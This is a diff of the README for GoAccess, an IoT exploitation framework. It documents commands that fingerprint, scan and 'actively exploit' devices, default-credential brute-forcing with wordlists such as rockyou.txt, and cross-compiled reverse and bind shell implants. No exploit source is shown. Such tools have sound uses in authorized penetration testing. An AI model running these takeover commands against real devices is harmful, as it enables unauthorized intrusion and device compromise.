@@ -1,163 +1,168 @@
-# GoAccess — IoT Exploitation Framework
+# GoAccess IoT Exploitation Framework
 
-GoAccess is an active IoT exploitation framework written entirely in Go (`CGO_ENABLED=0`) with zero runtime dependencies.
-It provides a CLI tool with three operational modes (`identify`, `scan`, `access`) and is designed as a reusable library.
+GoAccess is an active IoT exploitation framework written entirely in Pure Go with zero
+runtime dependencies. It provides a CLI with three operational modes `identify`, `scan`,
+and `access`. It is designed as a reusable and pluggable Go library.
 
 ## Features
 
-- **175 exploit modules** covering 57 vendors (D-Link, Cisco, Netgear, TP-Link, MikroTik, Huawei, WordPress, Tomcat, Jenkins, JBoss, SAP, Magento, and more)
-- **184 credential modules** with vendor-specific default wordlists and brute-force capabilities
-- **5 password generators** for MAC/serial-derived credentials (D-Link, TP-Link, Thomson, NETGEAR)
-- **Pure Go protocol clients**: HTTP/HTTPS, TCP, UDP, SSH, Telnet, FTP, SNMP
-- **Zero CGO dependencies**: all protocols use pure Go libraries (`golang.org/x/crypto/ssh`, `github.com/jlaffaye/ftp`, `github.com/gosnmp/gosnmp`)
-- **Multi-arch reverse shell payloads**: ARM, ARM64, MIPS, MIPSLE, MIPS64, x86, x86_64
-- **Channel-based worker pool** for concurrent scanning
-- **JSON output** for all commands with `--json` and `--output` flags
+- Around 180 exploit modules covering 57 vendors
+- Around 180 credential modules with vendor-specific default wordlists and brute-force capabilities
+- Password generators for MAC/serial-derived credentials
+- Pure Go protocol clients for HTTP/HTTPS, TCP, UDP, SSH, Telnet, FTP, SNMP
+- Zero CGo dependencies, making it a portable binary and library
+- Multi-architecture reverse shell payloads for `ARM`, `ARM64`, `MIPS`, `MIPSLE`, `MIPS64`, `x86`, `x86_64`
+- Channel-based worker pools for concurrent scanning
+- JSON output for all commands with `--json` and `--output` flags
 
 ## Installation
 
-```bash
-git clone https://github.com/cookiengineer/goaccess.git
-cd goaccess
-make build
-```
+Requires Go 1.22 or later. Binary is built to `./bin/goaccess`:
 
-Requires Go 1.22+. Binary outputs to `bin/goaccess`.
+```bash
+git clone https://github.com/cookiengineer/goaccess.git;
+cd goaccess;
+
+make build;
+```
 
 ## Quick Start
 
 ```bash
 # Identify a target device
-./bin/goaccess identify 192.168.1.1
+./bin/goaccess identify 192.168.1.1;
 
 # Scan for vulnerabilities
-./bin/goaccess scan 192.168.1.1 --threads 32
+./bin/goaccess scan 192.168.1.1 --threads 32;
 
 # Actively exploit and gain access
-./bin/goaccess access 192.168.1.1 --listen :4444
+./bin/goaccess access 192.168.1.1 --listen :4444;
 
 # List registered modules
-./bin/goaccess list exploits --vendor dlink
-./bin/goaccess list credentials --vendor tplink
-./bin/goaccess list payloads
-./bin/goaccess list keys
-./bin/goaccess list vendors
+./bin/goaccess list exploits --vendor dlink;
+./bin/goaccess list credentials --vendor tplink;
+./bin/goaccess list payloads;
+./bin/goaccess list keys;
+./bin/goaccess list vendors;
 ```
 
 ## Commands
 
-### `goaccess identify <target>`
+### Identify Target
 
-Fingerprint target hardware via port scanning, MAC OUI lookup, HTTP banner grab, UPnP SSDP probe, and SNMP sysDescr.
+Fingerprint target hardware via port scanning, MAC OUI lookup, HTTP banner grab, UPnP SSDP
+probe, and SNMP description.
 
 ```bash
-goaccess identify 192.168.1.1
-goaccess identify 192.168.1.1 --json --output result.json
-goaccess identify 192.168.1.1 --oui-only
-goaccess identify 192.168.1.1 --verbose
+goaccess identify 192.168.1.1;
+goaccess identify 192.168.1.1 --json --output result.json;
+goaccess identify 192.168.1.1 --oui-only;
+goaccess identify 192.168.1.1 --verbose;
 ```
 
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--json` | false | Output as JSON |
-| `--output` | — | Write JSON output to file |
-| `--oui-only` | false | Only show OUI vendor lookup |
-| `--verbose` | false | Verbose output |
-| `--threads` | 8 | Number of parallel threads |
-| `--timeout` | 8 | Timeout in seconds |
+| Flag         | Default | Description                 |
+|--------------|---------|-----------------------------|
+| `--json`     | false   | Output as JSON              |
+| `--output`   | (unset) | Write JSON output to file   |
+| `--oui-only` | false   | Only show OUI vendor lookup |
+| `--verbose`  | false   | Verbose output              |
+| `--threads`  | 8       | Number of parallel threads  |
+| `--timeout`  | 8       | Timeout in seconds          |
 
-### `goaccess scan <target>`
+### Scan Target
 
 Scan for vulnerabilities and default credentials.
 
 ```bash
-goaccess scan 192.168.1.1
-goaccess scan 192.168.1.1 --vendor dlink --type router
-goaccess scan 192.168.1.1 --threads 32 --timeout 10
-goaccess scan 192.168.1.1 --skip-creds
-goaccess scan 192.168.1.1 --username admin --password password --vendor wordpress
-goaccess scan 192.168.1.1 --json --output results.json
+goaccess scan 192.168.1.1;
+goaccess scan 192.168.1.1 --vendor dlink --type router;
+goaccess scan 192.168.1.1 --threads 32 --timeout 10;
+goaccess scan 192.168.1.1 --skip-creds;
+goaccess scan 192.168.1.1 --username admin --password password --vendor wordpress;
+goaccess scan 192.168.1.1 --json --output results.json;
 ```
 
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--vendor` | — | Filter exploits by vendor |
-| `--type` | — | Filter by device type (router, camera, drone, server, misc) |
-| `--threads` | 8 | Number of parallel threads |
-| `--timeout` | 8 | Timeout in seconds |
-| `--skip-creds` | false | Skip credential checks |
-| `--skip-exploits` | false | Skip exploit checks |
-| `--username` | admin | Username for authenticated takeover |
-| `--password` | — | Password for authenticated takeover |
-| `--password-list` | — | File of passwords to try with `--username` |
-| `--json` | false | Output as JSON (streams results) |
-| `--output` | — | Write JSON array to file |
-| `--verbose` | false | Verbose output |
+| Flag              | Default | Description                                |
+|-------------------|---------|--------------------------------------------|
+| `--vendor`        | (unset) | Filter exploits by vendor                  |
+| `--type`          | (unset) | Filter by device type                      |
+| `--threads`       | 8       | Number of parallel threads                 |
+| `--timeout`       | 8       | Timeout in seconds                         |
+| `--skip-creds`    | false   | Skip credential checks                     |
+| `--skip-exploits` | false   | Skip exploit checks                        |
+| `--username`      | admin   | Username for authenticated takeover        |
+| `--password`      | (unset) | Password for authenticated takeover        |
+| `--password-list` | (unset) | File of passwords to try with `--username` |
+| `--json`          | false   | Output as JSON (streams results)           |
+| `--output`        | (unset) | Write JSON array to file                   |
+| `--verbose`       | false   | Verbose output                             |
 
-### `goaccess access <target>`
+### Access Target
 
 Actively exploit a target to gain access.
 
 ```bash
-goaccess access 192.168.1.1
-goaccess access 192.168.1.1 --payload arm --listen :4444
-goaccess access 192.168.1.1 --shell
-goaccess access 192.168.1.1 --no-creds    # exploit only
-goaccess access 192.168.1.1 --no-exploit   # creds only
-goaccess access 192.168.1.1 --username admin --password password --vendor wordpress
-goaccess access 192.168.1.1 --username admin --password-list rockyou.txt
+goaccess access 192.168.1.1;
+goaccess access 192.168.1.1 --payload arm --listen :4444;
+goaccess access 192.168.1.1 --shell;
+
+goaccess access 192.168.1.1 --no-creds;     # exploit only
+goaccess access 192.168.1.1 --no-exploit;   # credentials only
+
+goaccess access 192.168.1.1 --username admin --password password --vendor wordpress;
+goaccess access 192.168.1.1 --username admin --password-list rockyou.txt;
 ```
 
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--threads` | 8 | Number of parallel threads |
-| `--timeout` | 8 | Timeout in seconds |
-| `--payload` | — | Preferred payload architecture |
-| `--listen` | 0 | Listen port for reverse shells |
-| `--shell` | false | Drop to interactive shell |
-| `--no-exploit` | false | Skip exploitation, creds only |
-| `--no-creds` | false | Skip credential checks |
-| `--vendor` | — | Filter exploits by vendor |
-| `--type` | — | Filter exploits by device type |
-| `--username` | admin | Username for authenticated takeover |
-| `--password` | — | Password for authenticated takeover |
-| `--password-list` | — | File of passwords to try with `--username` |
-| `--json` | false | Output as JSON |
-| `--output` | — | Write JSON output to file |
-| `--verbose` | false | Verbose output |
+| Flag              | Default | Description                                |
+|-------------------|---------|--------------------------------------------|
+| `--threads`       | 8       | Number of parallel threads                 |
+| `--timeout`       | 8       | Timeout in seconds                         |
+| `--payload`       | (unset) | Preferred payload architecture             |
+| `--listen`        | 0       | Listen port for reverse shells             |
+| `--shell`         | false   | Drop to interactive shell                  |
+| `--no-exploit`    | false   | Skip exploitation, creds only              |
+| `--no-creds`      | false   | Skip credential checks                     |
+| `--vendor`        | (unset) | Filter exploits by vendor                  |
+| `--type`          | (unset) | Filter exploits by device type             |
+| `--username`      | admin   | Username for authenticated takeover        |
+| `--password`      | (unset) | Password for authenticated takeover        |
+| `--password-list` | (unset) | File of passwords to try with `--username` |
+| `--json`          | false   | Output as JSON                             |
+| `--output`        | (unset) | Write JSON output to file                  |
+| `--verbose`       | false   | Verbose output                             |
 
-### `goaccess list <resource>`
+### List Modules
 
 List registered modules.
 
 ```bash
-goaccess list exploits         # all exploit modules
-goaccess list exploits --vendor dlink
-goaccess list credentials       # all credential modules
-goaccess list payloads          # available payload architectures
-goaccess list keys              # SSH hardcoded keys
-goaccess list vendors           # all vendor names
+goaccess list exploits;                # all exploit modules
+goaccess list exploits --vendor dlink; # filter exploits by vendor
+goaccess list credentials;             # all credential modules
+goaccess list payloads;                # available payload architectures
+goaccess list keys;                    # SSH hardcoded keys
+goaccess list vendors;                 # all vendor names
 ```
 
-## Build Payloads
+## Building Reverse Shell Payloads
 
 Cross-compile reverse shell implants for all architectures:
 
 ```bash
-make payloads
+make payloads;
 ```
 
 This produces 14 static binaries under `payload/`:
 
-| Arch | Reverse TCP | Bind TCP |
-|------|-------------|----------|
-| arm (ARMv5) | `payload/arm/reverse_tcp` | `payload/arm/bind_tcp` |
-| arm64 | `payload/arm64/reverse_tcp` | `payload/arm64/bind_tcp` |
-| mips | `payload/mips/reverse_tcp` | `payload/mips/bind_tcp` |
-| mipsle | `payload/mipsle/reverse_tcp` | `payload/mipsle/bind_tcp` |
-| mips64 | `payload/mips64/reverse_tcp` | `payload/mips64/bind_tcp` |
-| x86 | `payload/x86/reverse_tcp` | `payload/x86/bind_tcp` |
-| x86_64 | `payload/x86_64/reverse_tcp` | `payload/x86_64/bind_tcp` |
+| Arch     | Reverse TCP                  | Bind TCP                  |
+|----------|------------------------------|---------------------------|
+| `arm`    | `payload/arm/reverse_tcp`    | `payload/arm/bind_tcp`    |
+| `arm64`  | `payload/arm64/reverse_tcp`  | `payload/arm64/bind_tcp`  |
+| `mips`   | `payload/mips/reverse_tcp`   | `payload/mips/bind_tcp`   |
+| `mipsle` | `payload/mipsle/reverse_tcp` | `payload/mipsle/bind_tcp` |
+| `mips64` | `payload/mips64/reverse_tcp` | `payload/mips64/bind_tcp` |
+| `x86`    | `payload/x86/reverse_tcp`    | `payload/x86/bind_tcp`    |
+| `x86_64` | `payload/x86_64/reverse_tcp` | `payload/x86_64/bind_tcp` |
 
 ## Library Usage
 
@@ -171,6 +176,7 @@ import (
 )
 
 func main() {
+
     config := &types.ScanConfig{
         Target:  "192.168.1.1",
         Threads: 16,
@@ -191,10 +197,9 @@ func main() {
 
     // Access
     accessResult, _ := engine.Access("192.168.1.1", config)
+
 }
 ```
-
-## Protocol Clients
 
 Each protocol package exports a reusable client struct:
 
@@ -225,8 +230,6 @@ telnetClient.Login("admin", "admin")
 ## Writing Exploits
 
 See [CONTRIBUTING.md](docs/CONTRIBUTING.md) for a step-by-step guide on writing new exploit modules.
-
-Quick template:
 
 ```go
 package my_exploit
@@ -269,7 +272,7 @@ goaccess/
 ├── exploit/           # Global registry (Register, ByVendor, ByModel, Get)
 ├── scanner/           # Scan engine (Identify, Scan, Access with worker pool)
 ├── protocols/         # Pure Go clients: http, tcp, udp, ssh, telnet, ftp, snmp
-├── exploits/          # 175 exploit modules + 184 credential modules
+├── exploits/          # Exploit modules and Credential modules
 │   ├── generic/       # Heartbleed, Shellshock, RomPager, TCP-32764, GPON
 │   ├── routers/       # D-Link, Cisco, Netgear, TP-Link, MikroTik, ...
 │   ├── cameras/       # Brickcom, Grandstream, Honeywell, Siemens, ...
@@ -310,12 +313,11 @@ make build && make test && make lint
 Multi-arch Docker build for cross-compilation:
 
 ```bash
-docker build --platform linux/arm64 -t goaccess:arm64 .
-docker build --platform linux/mipsle -t goaccess:mipsle .
+docker build --platform linux/arm64 -t goaccess:arm64 .;
+docker build --platform linux/mipsle -t goaccess:mipsle .;
 ```
-
-GitHub Actions CI builds and tests on every push, and cross-compiles all 7 payload architectures on release.
 
 ## License
 
-See [LICENSE](LICENSE) for details.
+This project is licensed under the [GNU Affero GPL 3.0 license](./LICENSE_AGPL3.txt).
+
